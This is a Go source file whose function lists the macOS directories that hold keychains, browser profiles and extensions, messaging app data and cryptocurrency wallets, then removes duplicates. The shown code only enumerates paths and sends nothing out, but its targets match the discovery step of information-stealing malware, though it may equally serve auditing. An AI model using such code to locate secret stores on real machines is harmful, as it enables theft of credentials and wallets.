package discovery

import (
	"fmt"
	"os"
)

func CheckMacosDirectories() ([]string, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get user home directory: %w", err)
	}

	allFoundDirs := []string{}

	keychainDirs, err := CheckKeychainDirectories(homeDir)
	if err != nil {
		fmt.Printf("Error checking keychain directories: %v\n", err)
	}
	allFoundDirs = append(allFoundDirs, keychainDirs...)

	browserProfiles, browserExtensions, err := CheckBrowserDirectories(homeDir)
	if err != nil {
		fmt.Printf("Error checking browser directories: %v\n", err)
	}
	for _, profile := range browserProfiles {
		allFoundDirs = append(allFoundDirs, profile.Path)
	}
	for _, extension := range browserExtensions {
		allFoundDirs = append(allFoundDirs, extension.Path)
	}

	commDirs, err := CheckCommunicationAppDirectories(homeDir)
	if err != nil {
		fmt.Printf("Error checking communication app directories: %v\n", err)
	}
	allFoundDirs = append(allFoundDirs, commDirs...)

	cryptoDirs, err := CheckCryptoDirectories(homeDir)
	if err != nil {
		fmt.Printf("Error checking crypto directories: %v\n", err)
	}
	allFoundDirs = append(allFoundDirs, cryptoDirs...)

	uniqueDirs := removeDuplicates(allFoundDirs)

	return uniqueDirs, nil
}

func removeDuplicates(elements []string) []string {
	encountered := map[string]bool{}
	result := []string{}

	for v := range elements {
		if !encountered[elements[v]] {
			encountered[elements[v]] = true
			result = append(result, elements[v])
		}
	}
	return result
}
